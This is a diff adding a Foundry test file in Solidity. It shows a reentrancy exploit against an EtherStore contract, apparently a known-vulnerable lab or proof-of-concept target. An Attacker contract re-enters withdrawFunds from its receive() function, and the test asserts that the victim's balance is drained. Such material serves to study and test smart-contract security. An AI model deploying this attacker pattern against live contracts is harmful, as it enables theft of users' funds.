@@ -1,0 +1,87 @@
+
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.29;
+
+import {Test} from "../lib/forge-std/src/Test.sol";
+import {EtherStore} from "../src/EtherStore.sol";
+
+contract TestReentrancyEtherStore is Test {
+    EtherStore public _contractUnderTest;
+    Attacker public _attacker;
+
+    function setUp() public {
+        _contractUnderTest = new EtherStore();
+        _attacker = new Attacker(address(_contractUnderTest));
+    }
+
+    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
+        vm.assume(attackVal > 0.1 ether);
+        vm.assume(attackVal <= 5 ether);
+        vm.assume(attackVal <= _contractUnderTest.withdrawalLimit());
+
+        vm.deal(address(_contractUnderTest), attackVal * 2);
+        vm.deal(address(_attacker), attackVal * 2);
+        vm.deal(address(this), attackVal * 2);
+
+        _attacker.setupAttack{value: attackVal}(attackVal);
+
+        vm.warp(block.timestamp + 2 weeks);
+
+        uint256 victimBalanceBefore = address(_contractUnderTest).balance;
+        _attacker.attack(attackVal);
+        uint256 victimBalanceAfter = address(_contractUnderTest).balance;
+
+        assertTrue(
+            _attacker.exploitSucceeded(),
+            "Reentrancy attack failed: exploitSucceeded flag was not set."
+        );
+        assertLt(
+            victimBalanceAfter,
+            victimBalanceBefore,
+            "Victim balance should be reduced by the reentrancy attack."
+        );
+    }
+
+    receive() external payable {}
+}
+
+contract Attacker {
+    EtherStore public victim;
+
+    uint256 public attackCallCount;
+    bool public exploitSucceeded;
+    uint256 public initialSnapshot;
+    uint256 public storedAttackVal;
+
+    constructor(address victimAddress) {
+        victim = EtherStore(victimAddress);
+    }
+
+    function setupAttack(uint256 val) public payable {
+        attackCallCount = 1;
+        exploitSucceeded = false;
+        storedAttackVal = val;
+
+        victim.depositFunds{value: val}();
+    }
+
+    function attack(uint256 val) public {
+        initialSnapshot = address(this).balance;
+
+        require(val == storedAttackVal, "value mismatch");
+        require(val <= victim.withdrawalLimit(), "exceeds withdrawal limit");
+
+        victim.withdrawFunds(val);
+
+        if (address(this).balance > initialSnapshot + val) {
+            exploitSucceeded = true;
+        }
+    }
+
+    receive() external payable {
+        if (attackCallCount < 2) {
+            attackCallCount++;
+            victim.withdrawFunds(storedAttackVal);
+        }
+    }
+}
